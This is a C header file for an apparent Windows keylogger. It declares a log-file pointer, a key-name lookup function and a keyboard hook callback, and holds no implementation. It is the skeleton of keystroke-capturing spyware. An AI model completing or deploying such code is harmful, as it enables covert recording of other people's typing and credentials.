#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>

extern FILE *file;

const char* get_key_name(DWORD vkCode);

LRESULT CALLBACK hook_proc(int code, WPARAM wparam, LPARAM lparam);

#endif
